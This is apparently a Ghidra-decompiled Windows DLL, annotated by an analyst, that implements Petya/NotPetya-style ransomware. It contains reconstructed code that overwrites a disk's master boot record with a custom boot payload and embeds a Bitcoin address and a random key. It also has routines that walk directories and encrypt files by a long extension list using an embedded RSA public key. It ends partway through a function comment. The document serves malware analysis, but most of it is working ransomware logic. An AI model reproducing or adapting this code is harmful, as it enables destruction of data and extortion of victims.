undefined NetworkOperationUnderToken_10007D58;
undefined ImpersonatedNetworkWorker_10009F8E;
undefined DAT_1001f768;
undefined g_privilege_and_execution_flags;
LPCWSTR g_remote_execution_tool_path;
LPVOID DAT_1001f0fc;
DWORD DAT_1001f11c;
undefined SubnetWorker_10008E04;
int DAT_1001f120;
BOOL DAT_1001f114;
HMODULE DAT_1001f13c;
undefined DAT_1001f10c;
undefined CopiedImageCallback_100094A5;
void *DAT_1001f120;
undefined1 *DAT_1001f13c;
undefined4 DAT_1001f11c;
undefined4 DAT_1001f0fc;
short *g_remote_execution_tool_path;
LPCVOID DAT_1001f0fc;
undefined WorkItemForwarder_10009EA4;
undefined4 DAT_1001f140;
int DAT_1001f108;
int DAT_1001f110;
undefined RunNetworkWorker_1000A073;
undefined *PTR_GetProcessHeap_1000d1c0;
undefined *PTR_HeapAlloc_1000d1dc;
undefined DAT_1000d2d0;
undefined DAT_1000dad0;
undefined DAT_1000db50;
pointer switchdataD_1000b9e4;
undefined ZlibHelperUnknownA_1000C223;
undefined ZlibHelperUnknownB_1000C236;
undefined DAT_1000dd60;
undefined DAT_1000e160;
undefined DAT_1000e560;
undefined DAT_1000e960;
undefined DAT_1000fc36;
undefined DAT_1000fc76;
undefined DAT_1000feb8;
undefined DAT_1000fef8;
uint DAT_10016000;
undefined DAT_1000c64c;

/*
 * RECONSTRUCTED FUNCTION: AllocateZeroedHeapBuffer_10001000
 * Ghidra symbol: FUN_10001000 | VA: 0x10001000 | original source line: 995
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> requested_bytes
 */
void AllocateZeroedHeapBuffer_10001000(SIZE_T requested_bytes)

{
  HANDLE hHeap;
  DWORD dwFlags;
  
  dwFlags = 8;
  hHeap = GetProcessHeap();
  HeapAlloc(hHeap,dwFlags,requested_bytes);
  return;
}



/*
 * RECONSTRUCTED FUNCTION: ReleaseHeapBuffer_10001019
 * Ghidra symbol: FUN_10001019 | VA: 0x10001019 | original source line: 1009
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: GetProcessHeap
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> allocation_to_free
 */
void ReleaseHeapBuffer_10001019(LPVOID allocation_to_free)

{
  HANDLE hHeap;
  DWORD dwFlags;
  
  if (allocation_to_free != (LPVOID)0x0) {
    dwFlags = 8;
    hHeap = GetProcessHeap();
    HeapFree(hHeap,dwFlags,allocation_to_free);
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: ResolvePhysicalDiskPath_10001038
 * Ghidra symbol: FUN_10001038 | VA: 0x10001038 | original source line: 1025
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: GetSystemDirectoryA, CreateFileA, DeviceIoControl, GetLastError
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> physical_disk_path_out
 */
DWORD ResolvePhysicalDiskPath_10001038(char *physical_disk_path_out)

{
  char cVar1;
  UINT UVar2;
  DWORD DVar3;
  BOOL BVar4;
  char *pcVar5;
  uint uVar6;
  size_t sVar7;
  int iVar8;
  int *piVar9;
  undefined4 *puVar10;
  CHAR local_270;
  undefined1 local_26f [263];
  undefined4 local_168;
  char acStack_164 [260];
  undefined4 local_60 [2];
  int local_58 [6];
  char local_40;
  undefined4 local_3f;
  DWORD local_20;
  HANDLE local_1c;
  size_t local_18;
  DWORD local_14;
  CHAR local_10 [12];
  
  local_14 = 0;
  local_270 = '\0';
  memset(local_26f,0,0x103);
  local_168 = local_168 & 0xffffff00;
  memset((void *)((int)&local_168 + 1),0,0x103);
  local_60[0] = 0;
  piVar9 = local_58;
  for (iVar8 = 6; iVar8 != 0; iVar8 = iVar8 + -1) {
    *piVar9 = 0;
    piVar9 = piVar9 + 1;
  }
  local_40 = '\0';
  puVar10 = &local_3f;
  for (iVar8 = 7; iVar8 != 0; iVar8 = iVar8 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  *(undefined2 *)puVar10 = 0;
  builtin_memcpy(local_10,"\\\\.\\0:",7);
  local_20 = 0;
  *(undefined1 *)((int)puVar10 + 2) = 0;
  if (physical_disk_path_out == (char *)0x0) {
    DVar3 = 0xa0;
  }
  else {
    memset(physical_disk_path_out,0,0x104);
    local_168._0_1_ = '\\';
    local_168._1_1_ = '\\';
    local_168._2_1_ = '.';
    local_168._3_1_ = '\\';
    builtin_strncpy(acStack_164,"PhysicalDrive",0xe);
    UVar2 = GetSystemDirectoryA(&local_270,0x104);
    if (UVar2 != 0) {
      local_10[4] = local_270;
      local_1c = CreateFileA(local_10,0,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
      if (local_1c != (HANDLE)0xffffffff) {
        BVar4 = DeviceIoControl(local_1c,0x560000,(LPVOID)0x0,0,local_60,0x20,&local_20,
                                (LPOVERLAPPED)0x0);
        if (BVar4 == 0) {
          local_14 = GetLastError();
          if (0 < (int)local_14) {
            local_14 = local_14 & 0xffff | 0x80070000;
          }
        }
        else {
          _itoa(local_58[0],&local_40,10);
          pcVar5 = (char *)&local_168;
          do {
            cVar1 = *pcVar5;
            pcVar5 = pcVar5 + 1;
          } while (cVar1 != '\0');
          uVar6 = (int)pcVar5 - ((int)&local_168 + 1);
          pcVar5 = &local_40;
          do {
            cVar1 = *pcVar5;
            pcVar5 = pcVar5 + 1;
          } while (cVar1 != '\0');
          sVar7 = (int)pcVar5 - (int)&local_3f;
          local_18 = sVar7;
          if (sVar7 + 1 + uVar6 < 0x105) {
            if (uVar6 != 0) {
              if (0x103 < uVar6) {
                uVar6 = 0x103;
              }
              memcpy(physical_disk_path_out,&local_168,uVar6);
              sVar7 = local_18;
              physical_disk_path_out[uVar6] = '\0';
            }
            pcVar5 = physical_disk_path_out;
            do {
              cVar1 = *pcVar5;
              pcVar5 = pcVar5 + 1;
            } while (cVar1 != '\0');
            if ((sVar7 != 0) && (uVar6 = sVar7 + ((int)pcVar5 - (int)(physical_disk_path_out + 1)), uVar6 < 0x104))
            {
              memcpy(physical_disk_path_out + ((int)pcVar5 - (int)(physical_disk_path_out + 1)),&local_40,local_18);
              physical_disk_path_out[uVar6] = '\0';
            }
          }
          else {
            local_14 = 0x8007007a;
          }
        }
        CloseHandle(local_1c);
        return local_14;
      }
    }
    DVar3 = GetLastError();
    if (0 < (int)DVar3) {
      DVar3 = DVar3 & 0xffff | 0x80070000;
    }
  }
  return DVar3;
}



/*
 * RECONSTRUCTED FUNCTION: QueryDiskDeviceMetadata_1000122D
 * Ghidra symbol: FUN_1000122d | VA: 0x1000122D | original source line: 1149
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: CreateFileA, GetLastError, DeviceIoControl
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> physical_drive_path, param_2 -> disk_metadata_out
 */
DWORD QueryDiskDeviceMetadata_1000122D(LPCSTR physical_drive_path,undefined4 *disk_metadata_out)

{
  HANDLE hDevice;
  BOOL BVar1;
  DWORD DVar2;
  undefined4 local_9c [37];
  DWORD local_8;
  
  DVar2 = 0;
  local_8 = 0;
  if (physical_drive_path == (LPCSTR)0x0) {
    DVar2 = 0x80070057;
  }
  else {
    hDevice = CreateFileA(physical_drive_path,0x80100000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
    if (hDevice == (HANDLE)0xffffffff) {
      DVar2 = GetLastError();
      if (0 < (int)DVar2) {
        DVar2 = DVar2 & 0xffff | 0x80070000;
      }
    }
    else {
      BVar1 = DeviceIoControl(hDevice,0x70048,(LPVOID)0x0,0,local_9c,0x90,&local_8,(LPOVERLAPPED)0x0
                             );
      if (BVar1 == 0) {
        DVar2 = GetLastError();
        if (0 < (int)DVar2) {
          DVar2 = DVar2 & 0xffff | 0x80070000;
        }
      }
      else {
        *disk_metadata_out = local_9c[0];
      }
      CloseHandle(hDevice);
    }
  }
  return DVar2;
}



/*
 * RECONSTRUCTED FUNCTION: ReadSectorSizedDiskRecord_100012D5
 * Ghidra symbol: FUN_100012d5 | VA: 0x100012D5 | original source line: 1191
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileA, GetLastError, ReadFile
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> physical_drive_path, param_2 -> sector_buffer_out
 */
DWORD ReadSectorSizedDiskRecord_100012D5(LPCSTR physical_drive_path,void *sector_buffer_out)

{
  HANDLE hFile;
  BOOL BVar1;
  DWORD DVar2;
  DWORD unaff_EDI;
  DWORD local_8;
  
  DVar2 = 0;
  local_8 = 0;
  if (physical_drive_path == (LPCSTR)0x0) {
    return 0x80070057;
  }
  memset(sector_buffer_out,0,0x200);
  hFile = CreateFileA(physical_drive_path,0x80000000,1,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    DVar2 = GetLastError();
    if (0 < (int)DVar2) {
      DVar2 = DVar2 & 0xffff | 0x80070000;
    }
  }
  else {
    BVar1 = SetFilePointerEx(hFile,(LARGE_INTEGER)0x0,(PLARGE_INTEGER)0x0,unaff_EDI);
    if (((BVar1 == 0) ||
        (BVar1 = ReadFile(hFile,sector_buffer_out,0x200,&local_8,(LPOVERLAPPED)0x0), BVar1 == 0)) &&
       (DVar2 = GetLastError(), 0 < (int)DVar2)) {
      DVar2 = DVar2 & 0xffff | 0x80070000;
    }
    CloseHandle(hFile);
  }
  return DVar2;
}



/*
 * RECONSTRUCTED FUNCTION: WriteSectorSizedDiskRecord_10001384
 * Ghidra symbol: FUN_10001384 | VA: 0x10001384 | original source line: 1227
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileA, GetLastError, WriteFile
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> physical_drive_path, param_2 -> sector_buffer_in
 */
DWORD WriteSectorSizedDiskRecord_10001384(LPCSTR physical_drive_path,LPCVOID sector_buffer_in)

{
  HANDLE hFile;
  BOOL BVar1;
  DWORD unaff_EDI;
  DWORD DVar2;
  DWORD local_8;
  
  DVar2 = 0;
  local_8 = 0;
  if (physical_drive_path == (LPCSTR)0x0) {
    return 0x80070057;
  }
  hFile = CreateFileA(physical_drive_path,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile == (HANDLE)0xffffffff) {
    DVar2 = GetLastError();
    if (0 < (int)DVar2) {
      DVar2 = DVar2 & 0xffff | 0x80070000;
    }
  }
  else {
    BVar1 = SetFilePointerEx(hFile,(LARGE_INTEGER)0x0,(PLARGE_INTEGER)0x0,unaff_EDI);
    if (((BVar1 == 0) ||
        (BVar1 = WriteFile(hFile,sector_buffer_in,0x200,&local_8,(LPOVERLAPPED)0x0), BVar1 == 0)) &&
       (DVar2 = GetLastError(), 0 < (int)DVar2)) {
      DVar2 = DVar2 & 0xffff | 0x80070000;
    }
    CloseHandle(hFile);
  }
  return DVar2;
}



/*
 * RECONSTRUCTED FUNCTION: ObtainCryptoRandomBytes_10001424
 * Ghidra symbol: FUN_10001424 | VA: 0x10001424 | original source line: 1262
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CryptAcquireContextA, GetLastError, CryptGenRandom, CryptReleaseContext
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> random_bytes_out, param_2 -> requested_byte_count
 */
DWORD ObtainCryptoRandomBytes_10001424(BYTE *random_bytes_out,DWORD requested_byte_count)

{
  BOOL BVar1;
  HCRYPTPROV local_8;
  
  local_8 = 0;
  BVar1 = CryptAcquireContextA(&local_8,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);
  if (BVar1 == 0) {
    DAT_1001f8f8 = GetLastError();
    if (0 < (int)DAT_1001f8f8) {
      DAT_1001f8f8 = DAT_1001f8f8 & 0xffff | 0x80070000;
    }
    if ((int)DAT_1001f8f8 < 0) goto LAB_1000148c;
  }
  BVar1 = CryptGenRandom(local_8,requested_byte_count,random_bytes_out);
  if ((BVar1 == 0) && (DAT_1001f8f8 = GetLastError(), 0 < (int)DAT_1001f8f8)) {
    DAT_1001f8f8 = DAT_1001f8f8 & 0xffff | 0x80070000;
  }
LAB_1000148c:
  if (local_8 != 0) {
    CryptReleaseContext(local_8,0);
  }
  return DAT_1001f8f8;
}



/*
 * RECONSTRUCTED FUNCTION: PrepareDiskBootPayload_100014A9
 * Ghidra symbol: FUN_100014a9 | VA: 0x100014A9 | original source line: 1290
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: ResolvePhysicalDiskPath_10001038, QueryDiskDeviceMetadata_1000122D, ReadSectorSizedDiskRecord_100012D5, WriteSectorSizedDiskRecord_10001384, ObtainCryptoRandomBytes_10001424
 * ANALYST OBSERVATION: Disk-boot payload construction path; includes writes to a device, separate from file encryption.
 * ANALYST OBSERVATION: Do not conflate with propagation over SMB.
 */
void PrepareDiskBootPayload_100014A9(void)

{
  uint *puVar1;
  uint *puVar2;
  char cVar3;
  char *pcVar4;
  undefined4 *puVar5;
  uint *puVar6;
  DWORD DVar7;
  uint uVar8;
  uint *puVar9;
  uint uVar10;
  undefined4 *puVar11;
  int iVar12;
  byte *pbVar13;
  undefined4 *puVar14;
  undefined1 local_99c;
  undefined1 local_99b [511];
  byte local_79c [512];
  undefined4 local_59c;
  undefined4 local_3e4;
  undefined2 local_3e0;
  uint local_3de [16];
  undefined1 local_39c;
  BYTE local_39b [32];
  BYTE local_37b [8];
  undefined1 local_373 [34];
  undefined1 local_351;
  undefined1 local_2f3 [343];
  char local_19c;
  undefined1 local_19b [267];
  byte local_90 [60];
  char local_54 [64];
  uint local_14;
  uint local_10;
  undefined4 *local_c;
  void *local_8;
  
  local_19c = '\0';
  memset(local_19b,0,0x103);
  local_59c._0_1_ = 0;
  memset((void *)((int)&local_59c + 1),0,0x1ff);
  local_39c = 0;
  memset(local_39b,0,0x1ff);
  local_99c = 0;
  memset(local_99b,0,0x1ff);
  local_79c[0] = 0;
  memset(local_79c + 1,0,0x1ff);
  local_90[0] = 0;
  memset(local_90 + 1,0,0x3b);
  local_54[0] = '\0';
  memset(local_54 + 1,0,0x3c);
  local_10 = 0;
  DAT_1001f8f8 = ResolvePhysicalDiskPath_10001038(&local_19c);
  if ((int)DAT_1001f8f8 < 0) {
    return;
  }
  DAT_1001f8f8 = QueryDiskDeviceMetadata_1000122D(&local_19c,&local_8);
  if ((int)DAT_1001f8f8 < 0) {
    return;
  }
  if (local_8 == (void *)0x0) {
    DAT_1001f8f8 = ObtainCryptoRandomBytes_10001424(local_90,0x3c);
    if ((int)DAT_1001f8f8 < 0) {
      return;
    }
    uVar10 = 0;
    do {
      uVar8 = uVar10 + 1;
      local_54[uVar10] =
           "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
           [(uint)local_90[uVar10] % 0x3a];
      uVar10 = uVar8;
    } while (uVar8 < 0x3c);
    DAT_1001f8f8 = ReadSectorSizedDiskRecord_100012D5(&local_19c,&local_59c);
    if ((int)DAT_1001f8f8 < 0) {
      return;
    }
    puVar6 = local_3de + 2;
    iVar12 = 4;
    uVar10 = 0;
    do {
      uVar8 = *puVar6;
      if ((uVar8 != 0) && (uVar8 != 0xffffffff)) {
        uVar10 = uVar8;
      }
      puVar6 = puVar6 + 4;
      iVar12 = iVar12 + -1;
    } while (iVar12 != 0);
    if (uVar10 == 0xffffffff) {
      uVar10 = 0;
    }
    if (uVar10 < 0x29) {
      DAT_1001f8f8 = 0x80070272;
    }
    else {
      puVar5 = &local_59c;
      pbVar13 = local_79c;
      for (iVar12 = 0x80; iVar12 != 0; iVar12 = iVar12 + -1) {
        *(undefined4 *)pbVar13 = *puVar5;
        puVar5 = puVar5 + 1;
        pbVar13 = pbVar13 + 4;
      }
      uVar10 = 0;
      do {
        local_79c[uVar10] = local_79c[uVar10] ^ 7;
        uVar10 = uVar10 + 1;
      } while (uVar10 < 0x200);
      memset(&local_99c,7,0x200);
      local_39c = 0;
      DAT_1001f8f8 = ObtainCryptoRandomBytes_10001424(local_39b,0x20);
      if ((int)DAT_1001f8f8 < 0) {
        return;
      }
      DAT_1001f8f8 = ObtainCryptoRandomBytes_10001424(local_37b,8);
      if ((int)DAT_1001f8f8 < 0) {
        return;
      }
      memcpy(local_373,"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX",0x22);
      pcVar4 = local_54;
      local_351 = 0;
      do {
        cVar3 = *pcVar4;
        pcVar4 = pcVar4 + 1;
      } while (cVar3 != '\0');
      uVar10 = (int)pcVar4 - (int)(local_54 + 1);
      if (uVar10 != 0) {
        if (0x156 < uVar10) {
          uVar10 = 0x156;
        }
        memcpy(local_2f3,local_54,uVar10);
        local_2f3[uVar10] = 0;
      }
      local_c = (undefined4 *)(*(code *)PTR_FUN_1001b104)(0x200);
      if (local_c == (undefined4 *)0x0) {
        DAT_1001f8f8 = -0x7ff8fff2;
      }
      else {
        puVar5 = &DAT_10018c50;
        puVar11 = local_c;
        for (iVar12 = 0x80; iVar12 != 0; iVar12 = iVar12 + -1) {
          *puVar11 = *puVar5;
          puVar5 = puVar5 + 1;
          puVar11 = puVar11 + 1;
        }
        DAT_1001f8f8 = 0;
      }
      if ((int)DAT_1001f8f8 < 0) {
        return;
      }
      local_8 = (void *)(*(code *)PTR_FUN_1001b104)(0x22b1);
      if (local_8 == (void *)0x0) {
        DAT_1001f8f8 = -0x7ff8fff2;
      }
      else {
        local_10 = 0x22b1;
        memcpy(local_8,&DAT_10018e50,0x22b1);
        DAT_1001f8f8 = 0;
      }
      if ((int)DAT_1001f8f8 < 0) {
        return;
      }
      local_14 = (local_10 - (local_10 & 0x1ff)) + 0x400;
      puVar5 = (undefined4 *)(*(code *)PTR_FUN_1001b104)(local_14);
      if (puVar5 == (undefined4 *)0x0) {
        DAT_1001f8f8 = 0x8007000e;
      }
      else {
        puVar11 = local_c;
        puVar14 = puVar5;
        for (iVar12 = 0x80; iVar12 != 0; iVar12 = iVar12 + -1) {
          *puVar14 = *puVar11;
          puVar11 = puVar11 + 1;
          puVar14 = puVar14 + 1;
        }
        puVar5[0x6e] = local_3e4;
        *(undefined2 *)(puVar5 + 0x6f) = local_3e0;
        puVar6 = local_3de;
        puVar9 = (uint *)((int)puVar5 + 0x1be);
        iVar12 = 4;
        do {
          *puVar9 = *puVar6;
          puVar9[1] = puVar6[1];
          puVar2 = puVar9 + 3;
          puVar1 = puVar6 + 3;
          puVar9[2] = puVar6[2];
          puVar6 = puVar6 + 4;
          puVar9 = puVar9 + 4;
          iVar12 = iVar12 + -1;
          *puVar2 = *puVar1;
        } while (iVar12 != 0);
        memcpy(puVar5 + 0x80,local_8,local_10);
        uVar10 = local_14 >> 9;
        DVar7 = 0;
        if (uVar10 == 0) {
          DVar7 = 0x80070057;
        }
        else {
          uVar8 = 0;
          if (uVar10 != 0) {
            do {
              DVar7 = WriteSectorSizedDiskRecord_10001384(&local_19c,puVar5);
              if ((int)DVar7 < 0) break;
              uVar8 = uVar8 + 1;
              puVar5 = puVar5 + 0x80;
            } while (uVar8 < uVar10);
          }
        }
        if ((int)DVar7 < 0) {
          DAT_1001f8f8 = DVar7;
          return;
        }
        DAT_1001f8f8 = DVar7;
        DAT_1001f8f8 = WriteSectorSizedDiskRecord_10001384(&local_19c,&local_39c);
        if ((int)DAT_1001f8f8 < 0) {
          return;
        }
        DAT_1001f8f8 = WriteSectorSizedDiskRecord_10001384(&local_19c,&local_99c);
        if ((int)DAT_1001f8f8 < 0) {
          return;
        }
        DAT_1001f8f8 = WriteSectorSizedDiskRecord_10001384(&local_19c,local_79c);
      }
    }
  }
  else {
    DAT_1001f8f8 = 0x80070032;
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: EncryptMappedFileContent_1000189A
 * Ghidra symbol: FUN_1000189a | VA: 0x1000189A | original source line: 1524
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: CreateFileW, GetFileSizeEx, CreateFileMappingW, CryptEncrypt
 * Direct function references: none mapped
 * Parameter names recovered semantically: param_1 -> target_file_path, param_2 -> file_crypto_context
 * ANALYST OBSERVATION: File mapping and CryptEncrypt are inside this routine, independently of disk/MBR operations.
 */
void EncryptMappedFileContent_1000189A(LPCWSTR target_file_path,int file_crypto_context)

{
  HANDLE hFile;
  BYTE *pbData;
  BOOL BVar1;
  DWORD dwMaximumSizeLow;
  LARGE_INTEGER local_1c;
  HANDLE local_10;
  HANDLE local_c;
  BOOL local_8;
  
  hFile = CreateFileW(target_file_path,0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    local_10 = hFile;
    GetFileSizeEx(hFile,&local_1c);
    local_8 = 0;
    if ((local_1c.s.HighPart < 0) ||
       ((local_1c.s.HighPart < 1 && (local_1c.s.LowPart < (LPCWSTR)0x100001)))) {
      target_file_path = (LPCWSTR)local_1c.s.LowPart;
      local_8 = 1;
      dwMaximumSizeLow = ((local_1c.s.LowPart >> 4) + 1) * 0x10;
    }
    else {
      target_file_path = (LPCWSTR)0x100000;
      dwMaximumSizeLow = 0x100000;
    }
    local_c = CreateFileMappingW(hFile,(LPSECURITY_ATTRIBUTES)0x0,4,0,dwMaximumSizeLow,(LPCWSTR)0x0)
    ;
    if (local_c != (HANDLE)0x0) {
      pbData = MapViewOfFile(local_c,6,0,0,(SIZE_T)target_file_path);
      if (pbData != (BYTE *)0x0) {
        BVar1 = CryptEncrypt(*(HCRYPTKEY *)(file_crypto_context + 0x14),0,local_8,0,pbData,(DWORD *)&target_file_path,
                             dwMaximumSizeLow);
        if (BVar1 != 0) {
          FlushViewOfFile(pbData,(SIZE_T)target_file_path);
        }
        UnmapViewOfFile(pbData);
      }
      CloseHandle(local_c);
    }
    CloseHandle(local_10);
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: WalkMatchingFilesRecursively_10001973
 * Ghidra symbol: FUN_10001973 | VA: 0x10001973 | original source line: 1572
 * Confidence: HIGH (functional interpretation, not original author symbol)
 * API references: none directly identified
 * Direct function references: EncryptMappedFileContent_1000189A
 * Parameter names recovered semantically: param_1 -> directory_path, param_2 -> allow_traversal, param_3 -> file_crypto_context
 */
void WalkMatchingFilesRecursively_10001973(LPCWSTR directory_path,int allow_traversal,int file_crypto_context)

{
  WCHAR WVar1;
  LPWSTR pWVar2;
  HANDLE hFindFile;
  DWORD DVar3;
  int iVar4;
  WCHAR *pWVar5;
  BOOL BVar6;
  WCHAR *pWVar7;
  bool bVar8;
  _WIN32_FIND_DATAW local_870;
  WCHAR local_620 [260];
  WCHAR local_418 [260];
  WCHAR local_210 [262];
  
  if (((allow_traversal != 0) && (pWVar2 = PathCombineW(local_418,directory_path,L"*"), pWVar2 != (LPWSTR)0x0)) &&
     (hFindFile = FindFirstFileW(local_418,&local_870), hFindFile != (HANDLE)0xffffffff)) {
    do {
      if ((*(HANDLE *)(file_crypto_context + 0x1c) != (HANDLE)0x0) &&
         ((DVar3 = WaitForSingleObject(*(HANDLE *)(file_crypto_context + 0x1c),0), DVar3 == 0 ||
          (DVar3 == 0xffffffff)))) break;
      pWVar7 = L".";
      pWVar5 = local_870.cFileName;
      do {
        WVar1 = *pWVar5;
        bVar8 = (ushort)WVar1 < (ushort)*pWVar7;
        if (WVar1 != *pWVar7) {
LAB_10001a22:
          iVar4 = (1 - (uint)bVar8) - (uint)(bVar8 != 0);
          goto LAB_10001a27;
        }
        if (WVar1 == L'\0') break;
        WVar1 = pWVar5[1];
        bVar8 = (ushort)WVar1 < (ushort)pWVar7[1];
        if (WVar1 != pWVar7[1]) goto LAB_10001a22;
        pWVar5 = pWVar5 + 2;
        pWVar7 = pWVar7 + 2;
      } while (WVar1 != L'\0');
      iVar4 = 0;
LAB_10001a27:
      if (iVar4 != 0) {
        pWVar7 = L"..";
        pWVar5 = local_870.cFileName;
        do {
          WVar1 = *pWVar5;
          bVar8 = (ushort)WVar1 < (ushort)*pWVar7;
          if (WVar1 != *pWVar7) {
LAB_10001a5e:
            iVar4 = (1 - (uint)bVar8) - (uint)(bVar8 != 0);
            goto LAB_10001a63;
          }
          if (WVar1 == L'\0') break;
          WVar1 = pWVar5[1];
          bVar8 = (ushort)WVar1 < (ushort)pWVar7[1];
          if (WVar1 != pWVar7[1]) goto LAB_10001a5e;
          pWVar5 = pWVar5 + 2;
          pWVar7 = pWVar7 + 2;
        } while (WVar1 != L'\0');
        iVar4 = 0;
LAB_10001a63:
        if ((iVar4 != 0) &&
           (pWVar2 = PathCombineW(local_620,directory_path,local_870.cFileName), pWVar2 != (LPWSTR)0x0)) {
          if (((local_870.dwFileAttributes & 0x10) == 0) ||
             ((local_870.dwFileAttributes & 0x400) != 0)) {
            pWVar2 = PathFindExtensionW(local_870.cFileName);
            pWVar5 = local_870.cFileName;
            do {
              WVar1 = *pWVar5;
              pWVar5 = pWVar5 + 1;
            } while (WVar1 != L'\0');
            if (pWVar2 != local_870.cFileName + ((int)pWVar5 - (int)(local_870.cFileName + 1) >> 1))
            {
              wsprintfW(local_210,L"%ws.",pWVar2);
              pWVar2 = StrStrIW(L".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip."
                                ,local_210);
              if (pWVar2 != (LPWSTR)0x0) {
                EncryptMappedFileContent_1000189A(local_620,file_crypto_context);
              }
            }
          }
          else {
            pWVar2 = StrStrIW(L"C:\\Windows;",local_620);
            if (pWVar2 == (LPWSTR)0x0) {
              WalkMatchingFilesRecursively_10001973(local_620,allow_traversal + -1,file_crypto_context);
            }
          }
        }
      }
      BVar6 = FindNextFileW(hFindFile,&local_870);
    } while (BVar6 != 0);
    FindClose(hFindFile);
  }
  return;
}



/*
 * RECONSTRUCTED FUNCTION: InitializeFileEncryptionKeyMaterial_10001B4E
 * Ghidra symbol: FUN_10001b4e | VA: 0x10001B4E | original source line: 1671
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: CryptGenKey, CryptSetKeyParam
 * Direct function references: none mapped
 */
BOOL InitializeFileEncryptionKeyMaterial_10001B4E(void)

{
  HCRYPTKEY *phKey;
  int in_EAX;
  BOOL BVar1;
  BYTE local_c [8];
  
  phKey = (HCRYPTKEY *)(in_EAX + 0x14);
  BVar1 = CryptGenKey(*(HCRYPTPROV *)(in_EAX + 8),0x660e,1,phKey);
  if (BVar1 != 0) {
    local_c[4] = '\x01';
    local_c[5] = '\0';
    local_c[6] = '\0';
    local_c[7] = '\0';
    CryptSetKeyParam(*phKey,4,local_c + 4,0);
    local_c[0] = '\x01';
    local_c[1] = '\0';
    local_c[2] = '\0';
    local_c[3] = '\0';
    CryptSetKeyParam(*phKey,3,local_c,0);
  }
  return BVar1;
}



/*
 * RECONSTRUCTED FUNCTION: BuildFileCryptoIdentifier_10001BA0
 * Ghidra symbol: FUN_10001ba0 | VA: 0x10001BA0 | original source line: 1698
 * Confidence: MEDIUM (functional interpretation, not original author symbol)
 * API references: CryptStringToBinaryW, CryptStringToBinaryW, CryptDecodeObjectEx, CryptImportKey
 * Direct function references: none mapped
 */
BOOL BuildFileCryptoIdentifier_10001BA0(int param_1)

{
  BOOL BVar1;
  BYTE *pbBinary;
  BYTE *pbData;
  BOOL local_18;
  DWORD local_c;
  DWORD local_8;
  
  local_18 = 0;
  local_8 = 0;
  BVar1 = CryptStringToBinaryW
                    (*(LPCWSTR *)(param_1 + 0x10),0,1,(BYTE *)0x0,&local_8,(DWORD *)0x0,(DWORD *)0x0
                    );
  if ((BVar1 != 0) && (pbBinary = LocalAlloc(0x40,local_8), pbBinary != (BYTE *)0x0)) {
    BVar1 = CryptStringToBinaryW
                      (L"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB"
                       ,0,1,pbBinary,&local_8,(DWORD *)0x0,(DWORD *)0x0);
    if (BVar1 != 0) {
      local_c = 0;
      BVar1 = CryptDecodeObjectEx(0x10001,(LPCSTR)0x13,pbBinary,local_8,0,(PCRYPT_DECODE_PARA)0x0,
                                  (void *)0x0,&local_c);
      if ((BVar1 != 0) && (pbData = LocalAlloc(0x40,local_c), pbData != (BYTE *)0x0)) {
        BVar1 = CryptDecodeObjectEx(0x10001,(LPCSTR)0x13,pbBinary,local_8,0,(PCRYPT_DECODE_PARA)0x0,
                                    pbData,&local_c);
        if (BVar1 != 0) {
          local_18 = CryptImportKey(*(HCRYPTPROV *)(param_1 + 8),pbData,local_c,0,0,
                                    (HCRYPTKEY *)(param_1 + 0xc));
        }
        LocalFree(pbData);
      }
    }
    LocalFree(pbBinary);
  }
  return local_18;
}



/*
 * RECONSTRUCTED FUNCTION: SerializeCryptoIdentifier_10001C7F
